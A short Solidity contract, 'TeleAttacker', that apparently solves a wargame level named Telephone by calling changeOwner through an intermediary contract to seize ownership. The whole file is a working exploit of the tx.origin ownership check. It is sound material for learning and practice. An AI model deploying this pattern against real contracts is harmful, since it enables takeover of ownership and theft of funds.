pragma solidity ^0.8.0;

interface TelephoneInterface {
    function changeOwner(address _owner) external;
}

contract TeleAttacker {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() public {
        TelephoneInterface(instance).changeOwner(msg.sender);
    }
}